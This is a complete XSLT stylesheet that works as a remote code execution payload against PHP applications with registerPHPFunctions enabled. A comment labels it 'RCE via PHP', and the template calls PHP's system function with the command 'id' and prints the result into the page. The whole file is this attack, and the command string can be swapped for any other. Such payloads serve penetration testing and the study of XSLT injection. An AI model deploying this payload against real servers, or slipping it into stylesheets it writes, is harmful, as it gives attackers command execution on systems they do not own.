<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">
  <xsl:output method="html" indent="yes" />

  <!-- RCE via PHP registerPHPFunctions -->
  <xsl:template match="/">
    <html>
      <body>
        <h1>Command Output:</h1>
        <pre>
          <xsl:value-of select="php:function('system', 'id')"/>
        </pre>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
